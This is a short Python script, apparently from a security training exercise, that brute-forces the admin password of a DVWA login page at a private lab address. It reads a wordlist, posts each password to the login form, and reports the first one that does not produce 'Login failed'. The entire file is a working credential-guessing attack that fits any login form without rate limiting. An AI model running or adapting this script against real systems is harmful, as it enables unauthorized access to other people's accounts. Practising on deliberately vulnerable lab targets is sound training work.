#!/usr/bin/env python

import requests

target_url = "http://10.0.2.4/dvwa/login.php"
data_dict = {"username":"admin","password":"password","Login":"submit"}
#response = requests.post(target_url,data=data_dict)
#print(response.content)
with open("passwords.txt","r") as file:
    #print(file.read())
    for word in file:
        word = word.strip() # get rid of the new line character
        data_dict["password"] = word
        response = requests.post(target_url,data=data_dict)
        if "Login failed" not in response.text:
            print(f"[+] Password have been found for user admin. admin : {word}")
            exit(0)
        else:
            print("[+] Login guessing is still continuing.")
